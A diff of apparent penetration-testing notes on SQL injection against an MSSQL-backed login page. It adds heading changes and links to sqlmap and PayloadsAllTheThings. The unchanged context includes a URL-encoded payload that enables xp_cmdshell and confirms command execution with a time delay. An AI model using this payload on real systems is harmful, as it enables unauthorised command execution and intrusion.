@@ -6,13 +6,13 @@
 
 ---
 
-# Web Enumeration
+## Web Enumeration
 
-## Check
+### Check
 
 Add a single quotation to each field and see if there is an error.
 
-```request
+```http
 POST /login.aspx HTTP/1.1
 Host: 192.168.179.50
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
@@ -60,11 +60,11 @@ Priority: u=0, i
 </form>
 ```
 
-## Get columns
+### Get columns
 
 Use `ORDER BY n` to check the number of columns in response
 
-## Blind Execution
+### Blind Execution
 
 We can use a delay to verify that a command is being executed
 
@@ -84,6 +84,11 @@ to got the URI encoded body for query string if field does not allow for special
 '%20EXEC%20sp_configure%20'show%20advanced%20options'%2C%20'1'%3B%20RECONFIGURE%3B%20EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%20%3B%20RECONFIGURE%20%3B%20WAITFOR%20DELAY%20'00%3A00%3A03'%20--
 ```
 
-## Get reversre
+### Get reversre
 
 ../../infiltration/reverse-shell/sql.md
+
+## Resources
+
+- [sqlmap](https://sqlmap.org/) — automated follow-up when manual SQLi is confirmed
+- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) — payload lookup
